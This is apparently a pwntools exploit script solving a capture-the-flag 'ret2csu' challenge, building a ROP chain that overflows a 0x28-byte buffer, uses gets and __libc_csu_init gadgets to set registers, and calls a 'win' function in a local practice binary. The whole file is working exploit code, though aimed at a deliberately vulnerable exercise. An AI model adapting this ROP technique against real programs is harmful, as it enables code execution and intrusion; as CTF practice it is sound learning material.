from pwn import *

context.binary = elf = ELF("./vuln")
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
p = process()
rop = ROP(elf)
# 어짜피 rbx는 0이 됨~

'''
  4005e0:       4c 89 ea                mov    rdx,r13
  4005e3:       4c 89 f6                mov    rsi,r14
  4005e6:       44 89 ff                mov    edi,r15d
  4005e9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  4005ed:       48 83 c3 01             add    rbx,0x1
  4005f1:       48 39 eb                cmp    rbx,rbp
  4005f4:       75 ea                   jne    4005e0 <__libc_csu_init+0x40>
  4005f6:       48 83 c4 08             add    rsp,0x8
  4005fa:       5b                      pop    rbx
  4005fb:       5d                      pop    rbp
  4005fc:       41 5c                   pop    r12
  4005fe:       41 5d                   pop    r13
  400600:       41 5e                   pop    r14
  400602:       41 5f                   pop    r15
  400604:       c3                      ret    
'''

csu1 = 0x4005fc
csu2 = 0x4005e0

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
gets_plt = elf.plt["gets"]

value = 0xdeadbeefcafed00d
area = 0x006000b0+0x8

# buf2ret = 0x28(40)

print(hex(elf.sym["win"]))

pay = b'A'*0x28
pay += p64(pop_rdi) + p64(area) + p64(gets_plt)
pay += p64(area)
pay += p64(csu1)
pay += p64(0xdeadbeefcafed00d) + p64(0) + p64(0)
pay += p64(csu2)
# rop.raw(b'A'*0x28)
# rop.gets(elf.bss+0x100)
# rop.raw(csu1)
# rop.raw(elf.bss+0x100) # r12, call point
# rop.raw(0xdeadbeefcafed00d) # r13, the rdx.
# rop.raw(0) # r14, and we don't need ts vro..
# rop.raw(0) # r15, edi
# rop.raw(csu2)

p.sendlineafter(b'Come on then, ret2csu me', pay)
pause()
p.sendline(p64(elf.sym["win"]))

p.interactive()